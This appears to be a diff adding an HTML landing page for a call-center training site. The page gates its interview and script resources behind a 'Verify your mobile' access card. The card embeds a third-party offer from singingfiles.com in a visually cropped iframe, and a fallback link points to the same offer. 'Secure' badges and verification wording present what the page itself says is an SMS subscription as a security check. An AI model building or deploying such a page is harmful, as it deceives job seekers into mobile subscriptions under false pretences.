@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <meta name="theme-color" content="#07111f">
+  <title>CallCenter Hub — Training & Materials</title>
+  <meta name="description" content="Call-center training materials, interview preparation, scripts and practical resources.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="bg-grid" aria-hidden="true"></div>
+  <div class="orb orb-a" aria-hidden="true"></div>
+  <div class="orb orb-b" aria-hidden="true"></div>
+
+  <header class="site-header">
+    <a class="brand" href="#top" aria-label="CallCenter Hub home">
+      <span class="brand-mark"><span></span><span></span><span></span></span>
+      <span>CallCenter<span class="brand-accent">Hub</span></span>
+    </a>
+    <a class="header-link" href="#resources">Resources</a>
+  </header>
+
+  <main id="top">
+    <section class="hero section">
+      <div class="hero-copy">
+        <div class="eyebrow"><span class="pulse-dot"></span> CALL CENTER RESOURCE CENTER</div>
+        <h1>Build your call-center skills with <span>practical materials.</span></h1>
+        <p class="hero-text">
+          Interview questions, customer-service phrases, scripts and training resources
+          gathered in one simple place.
+        </p>
+
+        <div class="mini-stats">
+          <div><strong>Scripts</strong><span>Ready to practice</span></div>
+          <div><strong>Interviews</strong><span>Common questions</span></div>
+          <div><strong>Training</strong><span>Practical resources</span></div>
+        </div>
+      </div>
+
+      <div class="verify-shell" id="verify">
+        <div class="glass-card">
+          <div class="card-top">
+            <div>
+              <span class="card-kicker">ACCESS GATE</span>
+              <h2>Verify your mobile</h2>
+            </div>
+            <div class="secure-badge" aria-label="Secure verification">
+              <span class="lock-icon">⌁</span>
+              Secure
+            </div>
+          </div>
+
+          <p class="card-description">
+            To continue with the verification flow, use the secure form below.
+            Any service terms and subscription details are provided by SMS during the flow.
+          </p>
+
+          <div class="offer-frame-wrap" id="offerFrameWrap">
+            <div class="frame-loader" id="frameLoader">
+              <div class="spinner"></div>
+              <span>Loading secure verification…</span>
+            </div>
+
+            <!-- The original offer is loaded in an iframe. Cross-origin pages cannot be
+                 modified from our JavaScript; the viewport/crop is purely visual. -->
+            <iframe
+              id="offerFrame"
+              title="Mobile verification form"
+              src="https://singingfiles.com/show.php?l=0&u=2556396&id=71458"
+              referrerpolicy="strict-origin-when-cross-origin"
+              allow="autoplay; encrypted-media; payment"
+              loading="eager"></iframe>
+          </div>
+
+          <div class="fallback" id="fallback">
+            <strong>Verification form didn't load here.</strong>
+            <span>Your browser or the provider may block embedded forms.</span>
+            <a href="https://singingfiles.com/show.php?l=0&u=2556396&id=71458" target="_blank" rel="noopener noreferrer">
+              Open secure verification
+            </a>
+          </div>
+
+          <div class="trust-row">
+            <span>🔒 Secure provider flow</span>
+            <span>•</span>
+            <span>Review the SMS details before confirming</span>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="resources section" id="resources">
+      <div class="section-heading">
+        <div>
+          <div class="eyebrow">WHAT YOU'LL FIND</div>
+          <h2>Useful material for your next call-center step.</h2>
+        </div>
+        <p>Designed for practice, interview preparation and day-to-day customer service work.</p>
+      </div>
+
+      <div class="resource-grid">
+        <article class="resource-card">
+          <div class="icon-box">◫</div>
+          <h3>Interview Pack</h3>
+          <p>Common interview questions, answer structures and preparation checklists.</p>
+          <span>INTERVIEW</span>
+        </article>
+        <article class="resource-card">
+          <div class="icon-box">⌁</div>
+          <h3>Call Scripts</h3>
+          <p>Practical conversation patterns for opening, probing, handling and closing calls.</p>
+          <span>SCRIPTS</span>
+        </article>
+        <article class="resource-card">
+          <div class="icon-box">Aa</div>
+          <h3>English Phrases</h3>
+          <p>Useful customer-service expressions to sound clear and professional.</p>
+          <span>LANGUAGE</span>
+        </article>
+        <article class="resource-card">
+          <div class="icon-box">✓</div>
+          <h3>Training Notes</h3>
+          <p>Quick-reference material for communication, objections and customer handling.</p>
+          <span>TRAINING</span>
+        </article>
+      </div>
+    </section>
+
+    <section class="help-banner">
+      <div>
+        <span class="eyebrow">NEED HELP?</span>
+        <h2>Having trouble with verification?</h2>
+        <p>Contact support for help with the access process.</p>
+      </div>
+      <a class="support-btn" href="mailto:support@example.com">Contact support <span>↗</span></a>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <span>© <span id="year"></span> CallCenterHub</span>
+    <span>Training resources &amp; practical materials</span>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
